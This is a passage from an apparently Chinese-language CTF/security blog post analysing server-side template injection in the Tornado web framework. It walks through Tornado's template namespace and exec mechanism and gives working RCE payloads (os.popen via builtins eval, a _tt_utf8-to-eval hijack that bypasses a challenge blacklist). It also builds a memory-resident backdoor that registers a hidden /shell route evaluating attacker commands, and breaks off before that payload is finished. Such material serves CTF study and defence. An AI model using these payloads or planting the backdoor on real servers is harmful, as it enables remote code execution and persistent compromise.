        to `render` or `render_string`.
        </span><span class="sh">"""</span>
        <span class="n">namespace</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span>
            <span class="n">handler</span><span class="o">=</span><span class="n">self</span><span class="p">,</span>
            <span class="n">request</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">request</span><span class="p">,</span>
            <span class="n">current_user</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">current_user</span><span class="p">,</span>
            <span class="n">locale</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">locale</span><span class="p">,</span>
            <span class="n">_</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">locale</span><span class="p">.</span><span class="n">translate</span><span class="p">,</span>
            <span class="n">pgettext</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">locale</span><span class="p">.</span><span class="n">pgettext</span><span class="p">,</span>
            <span class="n">static_url</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">static_url</span><span class="p">,</span>
            <span class="n">xsrf_form_html</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">xsrf_form_html</span><span class="p">,</span>
            <span class="n">reverse_url</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">reverse_url</span><span class="p">,</span>
        <span class="p">)</span>
        <span class="n">namespace</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">ui</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">namespace</span>
</pre></td></tr></tbody></table></code></div></div>

<p>因此，在SSTI层面上我们可以说，<code class="language-plaintext highlighter-rouge">render()</code>是<code class="language-plaintext highlighter-rouge">generate()</code>的超集。只要能在<code class="language-plaintext highlighter-rouge">generate()</code>下执行的payload，基本上都能在<code class="language-plaintext highlighter-rouge">render()</code>下执行。</p>

<h3 id="generate过程中被引入的builtins"><span class="me-2">generate过程中被引入的builtins</span><a href="#generate过程中被引入的builtins" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>这一切都要源自于./tornado/template.py中的<code class="language-plaintext highlighter-rouge">Template</code>类的<code class="language-plaintext highlighter-rouge">generate()</code>方法中的一句话：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">exec_in</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">compiled</span><span class="p">,</span> <span class="n">namespace</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>这个方法来自于./tornado/util.py：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">exec_in</span><span class="p">(</span>
    <span class="n">code</span><span class="p">:</span> <span class="n">Any</span><span class="p">,</span> <span class="n">glob</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">],</span> <span class="n">loc</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">Optional</span><span class="p">[</span><span class="n">Mapping</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]]]</span> <span class="o">=</span> <span class="bp">None</span>
<span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
        <span class="c1"># exec(string) inherits the caller's future imports; compile
</span>        <span class="c1"># the string first to prevent that.
</span>        <span class="n">code</span> <span class="o">=</span> <span class="nf">compile</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="sh">"</span><span class="s">&lt;string&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">,</span> <span class="n">dont_inherit</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="nf">exec</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">glob</span><span class="p">,</span> <span class="n">loc</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>我们发现在函数的末尾执行了Python自带的<code class="language-plaintext highlighter-rouge">exec</code>。</p>

<p>Python的特性在此刻发力：如果你用 <code class="language-plaintext highlighter-rouge">exec(code, globals_dict)</code>，且 <code class="language-plaintext highlighter-rouge">globals_dict</code> 里面 <strong>没有</strong> <code class="language-plaintext highlighter-rouge">__builtins__</code> 这个 key，Python 会自动把内建模块放进去（类似于 <code class="language-plaintext highlighter-rouge">globals_dict["__builtins__"] = builtins</code>）。</p>

<p>来源在https://docs.python.org/3/library/functions.htm，里面有这样一句话：</p>

<blockquote>
  <p>If the globals dictionary does not contain a value for the key <code class="language-plaintext highlighter-rouge">__builtins__</code>, a reference to the dictionary of the built-in module builtins is inserted under that key. That way you can control what builtins are available to the executed code by inserting your own <code class="language-plaintext highlighter-rouge">__builtins__</code> dictionary into globals before passing it to exec().</p>
</blockquote>

<p>这几乎是明示我们，整个tornado的模板环境一旦暴露，就会暴露全局空间中的所有builtins函数，也就是说，没有加任何WAF的Tornado SSTI漏洞是可以直接通过：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">whoami</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="nf">eval</span><span class="p">(</span><span class="sh">"</span><span class="s">__import__(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">).popen(</span><span class="sh">'</span><span class="s">whoami</span><span class="sh">'</span><span class="s">).read()</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>执行操作。</p>

<h3 id="基于generate的payload构造"><span class="me-2">基于generate的Payload构造</span><a href="#基于generate的payload构造" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>类似Flask地，/我们现从全局变量下手，虽然前面已经说过，我们可以直接调用builtins的函数，但是不妨碍我们继续研究。显而易见的是，只要含有SSTI漏洞的位置，必然可以产生由<code class="language-plaintext highlighter-rouge">基本数据类型-&gt;类-&gt;object-&gt;subclass</code>这一条链路，所以这里不再赘述。</p>

<p>现从<code class="language-plaintext highlighter-rouge">generate()</code>看起：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="n">namespace</span> <span class="o">=</span> <span class="p">{</span>
      <span class="sh">"</span><span class="s">escape</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">xhtml_escape</span><span class="p">,</span>
      <span class="sh">"</span><span class="s">xhtml_escape</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">xhtml_escape</span><span class="p">,</span>
      <span class="sh">"</span><span class="s">url_escape</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">url_escape</span><span class="p">,</span>
      <span class="sh">"</span><span class="s">json_encode</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">json_encode</span><span class="p">,</span>
      <span class="sh">"</span><span class="s">squeeze</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">squeeze</span><span class="p">,</span>
      <span class="sh">"</span><span class="s">linkify</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">linkify</span><span class="p">,</span>
      <span class="sh">"</span><span class="s">datetime</span><span class="sh">"</span><span class="p">:</span> <span class="n">datetime</span><span class="p">,</span>
      <span class="sh">"</span><span class="s">_tt_utf8</span><span class="sh">"</span><span class="p">:</span> <span class="n">escape</span><span class="p">.</span><span class="n">utf8</span><span class="p">,</span>  <span class="c1"># for internal use
</span>      <span class="sh">"</span><span class="s">_tt_string_types</span><span class="sh">"</span><span class="p">:</span> <span class="p">(</span><span class="n">unicode_type</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">),</span>
      <span class="c1"># __name__ and __loader__ allow the traceback mechanism to find
</span>      <span class="c1"># the generated source code.
</span>      <span class="sh">"</span><span class="s">__name__</span><span class="sh">"</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">_</span><span class="sh">"</span><span class="p">),</span>
      <span class="sh">"</span><span class="s">__loader__</span><span class="sh">"</span><span class="p">:</span> <span class="nc">ObjectDict</span><span class="p">(</span><span class="n">get_source</span><span class="o">=</span><span class="k">lambda</span> <span class="n">name</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">code</span><span class="p">),</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>注意到上面所述的全局变量基本都来自于<code class="language-plaintext highlighter-rouge">escape</code>，我们很自然地想要知道<code class="language-plaintext highlighter-rouge">escape</code>的构成。<code class="language-plaintext highlighter-rouge">escape</code>是一个模块，在./tornado/escape.py下，我们可以看到，上述的这几个变量全部都是函数对象，这说明我们可以像使用Jinja2中的<code class="language-plaintext highlighter-rouge">lipsum</code>一样去使用他们，但是令人沮丧的是：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">html</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">urllib.parse</span>

<span class="kn">from</span> <span class="n">tornado.util</span> <span class="kn">import</span> <span class="n">unicode_type</span>

<span class="kn">import</span> <span class="n">typing</span>
<span class="kn">from</span> <span class="n">typing</span> <span class="kn">import</span> <span class="n">Union</span><span class="p">,</span> <span class="n">Any</span><span class="p">,</span> <span class="n">Optional</span><span class="p">,</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">List</span><span class="p">,</span> <span class="n">Callable</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">escape</code>这个模块并没有引入<code class="language-plaintext highlighter-rouge">os</code>模块，这意味着我们只能通过<code class="language-plaintext highlighter-rouge">__builtins__</code>去获取<code class="language-plaintext highlighter-rouge">eval</code>从而执行恶意代码，一个payload如下：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">escape</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">eval</span><span class="sh">'</span><span class="p">](</span><span class="sh">"</span><span class="s">__import__(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">).popen(</span><span class="sh">'</span><span class="s">whoami</span><span class="sh">'</span><span class="s">).read()</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>此外<code class="language-plaintext highlighter-rouge">datetime</code>没有什么好利用的，它直接来源于python标准库。</p>

<p>之后，我们尝试着触发一个报错<code class="language-plaintext highlighter-rouge">http://localhost:8888/render?ssti={{e}}</code>。</p>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"E:</span><span class="se">\P</span><span class="s2">rogramFile</span><span class="se">\P</span><span class="s2">ython</span><span class="se">\P</span><span class="s2">ython312</span><span class="se">\L</span><span class="s2">ib</span><span class="se">\s</span><span class="s2">ite-packages</span><span class="se">\t</span><span class="s2">ornado</span><span class="se">\w</span><span class="s2">eb.py"</span>, line 1788, <span class="k">in </span>_execute
    result <span class="o">=</span> method<span class="o">(</span><span class="k">*</span>self.path_args, <span class="k">**</span>self.path_kwargs<span class="o">)</span>
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File <span class="s2">"E:</span><span class="se">\c</span><span class="s2">tfTools</span><span class="se">\C</span><span class="s2">tfLab</span><span class="se">\P</span><span class="s2">yTrojan</span><span class="se">\t</span><span class="s2">ornado_lab.py"</span>, line 16, <span class="k">in </span>get
    self.write<span class="o">(</span>tmpl.generate<span class="o">())</span>
               ^^^^^^^^^^^^^^^
  File <span class="s2">"E:</span><span class="se">\P</span><span class="s2">rogramFile</span><span class="se">\P</span><span class="s2">ython</span><span class="se">\P</span><span class="s2">ython312</span><span class="se">\L</span><span class="s2">ib</span><span class="se">\s</span><span class="s2">ite-packages</span><span class="se">\t</span><span class="s2">ornado</span><span class="se">\t</span><span class="s2">emplate.py"</span>, line 362, <span class="k">in </span>generate
    <span class="k">return </span>execute<span class="o">()</span>
           ^^^^^^^^^
  File <span class="s2">"&lt;string&gt;.generated.py"</span>, line 5, <span class="k">in </span>_tt_execute
    _tt_tmp <span class="o">=</span> e  <span class="c"># &lt;string&gt;:1</span>
              ^
NameError: name <span class="s1">'e'</span> is not defined
</pre></td></tr></tbody></table></code></div></div>

<p>我们发现，<code class="language-plaintext highlighter-rouge">_tt_tmp</code>就是我们传入需要被动态渲染的内容。我们持续追踪这个代码，在./tornado/template.py中可以看到在<code class="language-plaintext highlighter-rouge">_Expression(_Node)</code>中的<code class="language-plaintext highlighter-rouge">generate()</code>函数：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">writer</span><span class="p">:</span> <span class="sh">"</span><span class="s">_CodeWriter</span><span class="sh">"</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="c1"># 1. 先把表达式求值
</span>    <span class="n">writer</span><span class="p">.</span><span class="nf">write_line</span><span class="p">(</span><span class="sh">"</span><span class="s">_tt_tmp = %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">expression</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">line</span><span class="p">)</span>

    <span class="c1"># 2. 如果是字符串，就直接用 _tt_utf8 处理
</span>    <span class="n">writer</span><span class="p">.</span><span class="nf">write_line</span><span class="p">(</span>
        <span class="sh">"</span><span class="s">if isinstance(_tt_tmp, _tt_string_types):</span><span class="sh">"</span>
        <span class="sh">"</span><span class="s"> _tt_tmp = _tt_utf8(_tt_tmp)</span><span class="sh">"</span><span class="p">,</span>
        <span class="n">self</span><span class="p">.</span><span class="n">line</span><span class="p">,</span>
    <span class="p">)</span>

    <span class="c1"># 3. 否则先 str(...) 再丢给 _tt_utf8
</span>    <span class="n">writer</span><span class="p">.</span><span class="nf">write_line</span><span class="p">(</span><span class="sh">"</span><span class="s">else: _tt_tmp = _tt_utf8(str(_tt_tmp))</span><span class="sh">"</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">line</span><span class="p">)</span>

    <span class="c1"># 4. 如果开启了 autoescape，再额外套一层 autoescape 函数
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="n">raw</span> <span class="ow">and</span> <span class="n">writer</span><span class="p">.</span><span class="n">current_template</span><span class="p">.</span><span class="n">autoescape</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">writer</span><span class="p">.</span><span class="nf">write_line</span><span class="p">(</span>
            <span class="sh">"</span><span class="s">_tt_tmp = _tt_utf8(%s(_tt_tmp))</span><span class="sh">"</span> <span class="o">%</span> <span class="n">writer</span><span class="p">.</span><span class="n">current_template</span><span class="p">.</span><span class="n">autoescape</span><span class="p">,</span>
            <span class="n">self</span><span class="p">.</span><span class="n">line</span><span class="p">,</span>
        <span class="p">)</span>

    <span class="c1"># 5. 最后把结果 append 到输出
</span>    <span class="n">writer</span><span class="p">.</span><span class="nf">write_line</span><span class="p">(</span><span class="sh">"</span><span class="s">_tt_append(_tt_tmp)</span><span class="sh">"</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">line</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>所有的模板引擎都会有“用代码写代码”这一步骤，我们会发现，这里出现了<code class="language-plaintext highlighter-rouge">_tt_utf8</code>，这是一个惊人的发现，因为任何输入的内容都会经过<code class="language-plaintext highlighter-rouge">_tt_utf8</code>，如果我们劫持<code class="language-plaintext highlighter-rouge">_tt_utf8</code>也许就能实现我们想要的操作。</p>

<h3 id="劫持_tt_utf8"><span class="me-2">劫持<code class="language-plaintext highlighter-rouge">_tt_utf8</code></span><a href="#劫持_tt_utf8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>得益于Python的弱类型机制以及万物皆对象的特性，我们可以传递函数引用来给不同函数名赋值。就像上面说的，如果我们显式地：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>{% set _tt_utf8 = eval %}
</pre></td></tr></tbody></table></code></div></div>

<p>那么我们就可以控制所有的传入内容。</p>

<p>[NSSCTF 2nd]MyHurricane这道题目中就利用了这个知识点。题目的WAF有：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">bl</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="se">\'</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'"'</span><span class="p">,</span> <span class="sh">'</span><span class="s">__</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">(</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">)</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">or</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">and</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">not</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">{{</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">}}</span><span class="sh">'</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></div></div>

<p>这逼迫我们用非函数调用的方式去执行Payload。方法也很简单，劫持<code class="language-plaintext highlighter-rouge">_tt_utf8</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>{% set _tt_utf8 = eval %}
{% raw request.body_arguments[request.method][0] %}

POST=__import('os')__.popen('whoami').read()
</pre></td></tr></tbody></table></code></div></div>

<p>第一行不再赘述，第二行<code class="language-plaintext highlighter-rouge">raw</code>在Tornado中代表输出表达式的结果，而且不做 autoescape（自动转义）。所以我们可以通过request来获取我们传入的内容，然后让内容被<code class="language-plaintext highlighter-rouge">_tt_utf8</code>转码（但此时<code class="language-plaintext highlighter-rouge">_tt_utf8</code>已经被<code class="language-plaintext highlighter-rouge">eval</code>夺舍了）。至于<code class="language-plaintext highlighter-rouge">request.method</code>，是一个小技巧，由于我们的方法是POST，所以request.method就是POST（字符串类型），所以这里相当于<code class="language-plaintext highlighter-rouge">['POST']</code>，为了绕过引号而做出的妥协。</p>

<p>接下来我们看<code class="language-plaintext highlighter-rouge">render()</code>导入的全局：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">namespace</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span>
      <span class="n">handler</span><span class="o">=</span><span class="n">self</span><span class="p">,</span>
      <span class="n">request</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">request</span><span class="p">,</span>
      <span class="n">current_user</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">current_user</span><span class="p">,</span>
      <span class="n">locale</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">locale</span><span class="p">,</span>
      <span class="n">_</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">locale</span><span class="p">.</span><span class="n">translate</span><span class="p">,</span>
      <span class="n">pgettext</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">locale</span><span class="p">.</span><span class="n">pgettext</span><span class="p">,</span>
      <span class="n">static_url</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">static_url</span><span class="p">,</span>
      <span class="n">xsrf_form_html</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">xsrf_form_html</span><span class="p">,</span>
      <span class="n">reverse_url</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">reverse_url</span><span class="p">,</span>
<span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>没有什么好赘述的，参考前面的利用逻辑即可。这里的<code class="language-plaintext highlighter-rouge">handler</code>比较特殊，我们可以利用它访问很多内置属性，类似jinja2的<code class="language-plaintext highlighter-rouge">config</code>。这里不再深入研究。<del>（等碰到了再说吧）</del></p>

<h3 id="内存马"><span class="me-2">内存马</span><a href="#内存马" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>实际上来说，在没有任何waf的情况下，给tornado漏洞打入内存马有些杀鸡用牛刀，但不妨碍我们进行技术研究。</p>

<p>一种常见的内存马构建思路就是新建路由，我们查询一下：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>    <span class="k">def</span> <span class="nf">add_handlers</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">host_pattern</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">host_handlers</span><span class="p">:</span> <span class="n">_RuleList</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
        <span class="sh">"""</span><span class="s">Appends the given handlers to our handler list.

        Host patterns are processed sequentially in the order they were
        added. All matching patterns will be considered.
        </span><span class="sh">"""</span>
</pre></td></tr></tbody></table></code></div></div>

<p>所以我们知道，<code class="language-plaintext highlighter-rouge">host_pattern</code>的类型是<code class="language-plaintext highlighter-rouge">str</code>，意味着路由匹配；<code class="language-plaintext highlighter-rouge">host_handlers</code>的类型是<code class="language-plaintext highlighter-rouge">_RuleList</code>，即一个列表，这个列表前面需要一个<code class="language-plaintext highlighter-rouge">str</code>类型的路由，后面需要一个<code class="language-plaintext highlighter-rouge">tornado.web.RequestHandler</code>类型的Handler类。</p>

<p>我们构建一个恶意类来处理我们的操作：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">BackdoorHandler</span><span class="p">(</span><span class="n">tornado</span><span class="p">.</span><span class="n">web</span><span class="p">.</span><span class="n">RequestHandler</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">code</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">get_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">cmd</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="nf">eval</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>  
        <span class="n">self</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<p>那么在注册路由的时候就是：</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">handler</span><span class="p">.</span><span class="n">application</span><span class="p">.</span><span class="nf">add_handlers</span><span class="p">(</span><span class="sh">"</span><span class="s">.*</span><span class="sh">"</span><span class="p">,([</span><span class="sh">"</span><span class="s">/shell</span><span class="sh">"</span><span class="p">,</span><span class="n">BackdoorHandler</span><span class="p">])</span>
                                <span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>为了缩短它，我们继续使用一些小技巧。在python中<code class="language-plaintext highlighter-rouge">type(name, bases, dict)</code> 是 Python 造类的底层接口，name是类名，bases是继承，dict是类的字典。于是我们可以构造</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">type</span><span class="p">(</span><span class="sh">"</span><span class="s">Shell</span><span class="sh">"</span><span class="p">,</span>
     <span class="p">(</span><span class="nf">__import__</span><span class="p">(</span><span class="sh">"</span><span class="s">tornado</span><span class="sh">"</span><span class="p">).</span><span class="n">web</span><span class="p">.</span><span class="n">RequestHandler</span><span class="p">,),</span>
     <span class="p">{</span><span class="sh">"</span><span class="s">shell</span><span class="sh">"</span><span class="p">:</span>
       <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span>
       <span class="n">s</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">get_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">cmd</span><span class="sh">"</span><span class="p">))))</span>
     <span class="p">}</span>
     <span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>所以最终有内存马:</p>

<div class="language-python highlighter-rouge"><div class="code-header">
